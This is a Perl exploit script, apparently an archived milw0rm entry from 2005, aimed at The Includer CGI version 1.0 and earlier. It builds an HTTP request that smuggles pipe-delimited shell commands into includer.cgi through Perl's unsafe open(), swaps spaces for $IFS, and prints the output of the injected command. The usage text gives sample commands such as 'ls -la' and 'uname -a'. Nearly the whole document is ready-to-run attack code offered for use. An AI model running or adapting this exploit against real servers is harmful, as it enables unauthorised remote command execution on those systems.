                                                                                                                                                                                                                                                               #!/usr/bin/perl

############################################################
# Target - The Includer CGI <= 1.0                         #
#                                                          #
# Based on - http://www.milw0rm.com/id.php?id=862          #
#                                                          #
# Info about bug - Stupid use "Open" function.             #
#                                                          #
############################################################
# If you want know more visit our home page at nst.void.ru #
############################################################
use IO::Socket;


if (@ARGV < 3)
{
  print " \n Includer CGI <= 1.0 Network Security Team - nst.void.ru\n\n";
  print " Usage: <target> <dir> <cmd>\n\n"; 
  print "   <host> - Host name of taget.\n";
  print "   <dir> - If not in dir type / symbol.\n";
  print "   <cmd> - command for execution.\n\n";
  print " Examples:\n\n";
  print "   incl_10.pl 127.0.0.1 /cgi-bin/ \"ls -la\"\n";
  print "   incl_10.pl 127.0.0.1 / \"uname -a\"\n";
  print "   incl_10.pl www.test.com / \"ps auxw\"\n";
  exit();
}


$serv = $ARGV[0];
$serv =~ s/http:\/\///ge;

$dir = $ARGV[1];
$cmd = $cmde = $ARGV[2];
  
print "\n ===[ Info for query ]========================\n";   
print " = Target: $serv\n";
print " = Dir: $dir\n";
print " = Cmd: $cmd\n";
print " =============================================\n\n";   

$cmde =~ s/ /"\$IFS"/ge;

$req  = "GET http://$serv";                                      
$req .= "$dir";
$req .= "includer.cgi?|echo\$IFS\"_N_\";$cmde;echo\$IFS\"_T_\"| HTTP/1.0\n\n";


$s = IO::Socket::INET->new(Proto=>"tcp",
                           PeerAddr=>"$serv",
                           PeerPort=>80) or die " (-) - Can't connect to the server\n";

print $s $req;

$flag = 0;

while ($ans = <$s>)

 {
   if ($ans =~ /_T_/) { print " =========================================================\n"; exit() }
   if ($flag == 1) { print " $ans"; }
   if ($ans =~ /^_N_/) { print " ===[ Executed command $cmd ]===============================\n"; $flag = 1 }
   
 }

# milw0rm.com [2005-04-08]